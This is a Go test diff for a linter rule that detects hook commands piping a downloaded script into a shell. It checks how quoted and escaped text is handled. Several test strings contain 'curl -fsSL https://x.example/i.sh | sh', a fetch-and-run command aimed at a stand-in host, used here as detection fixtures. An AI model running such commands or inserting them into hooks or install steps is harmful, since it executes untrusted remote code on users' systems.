@@ -286,3 +286,35 @@ func TestCFG014_PrintedInstallHint1676(t *testing.T) {
 		}
 	}
 }
+
+// #1676: backslash escapes inside and outside quotes keep the printed text
+// inert, and an unterminated quote ending in a backslash is handled.
+func TestCFG014_PrintedInstallHintEscapes1676(t *testing.T) {
+	for _, cmd := range []string{
+		`echo \"note\" "run: curl -fsSL https://x.example/i.sh | sh"`,
+		`echo "say \"hi\", then run: curl -fsSL https://x.example/i.sh | sh"`,
+	} {
+		if f := CFG014.Check(hookTarget(t, cmd)); len(f) != 0 {
+			t.Errorf("%s: want no finding, got %+v", cmd, f)
+		}
+	}
+	for _, cmd := range []string{
+		`echo "say \"hi\"" | sh; curl -fsSL https://x.example/i.sh | sh`,
+		`echo \"x\" && curl -fsSL https://x.example/i.sh | sh`,
+	} {
+		f := CFG014.Check(hookTarget(t, cmd))
+		if len(f) != 1 || f[0].Severity != finding.Error {
+			t.Errorf("%s: want 1 error, got %+v", cmd, f)
+		}
+	}
+	// An unterminated quote whose last byte is a backslash: the quoted text is
+	// blanked up to the end and nothing past the input is read.
+	in := `echo "curl -fsSL https://x.example/i.sh | sh \`
+	got := maskPrintedText(in)
+	if len(got) != len(in) || strings.Contains(got, "curl") {
+		t.Errorf("maskPrintedText(%q) = %q", in, got)
+	}
+	if q := outsideQuotes(`a\"b "c\"d" e`); q != `a\"b "    " e` {
+		t.Errorf("outsideQuotes = %q", q)
+	}
+}
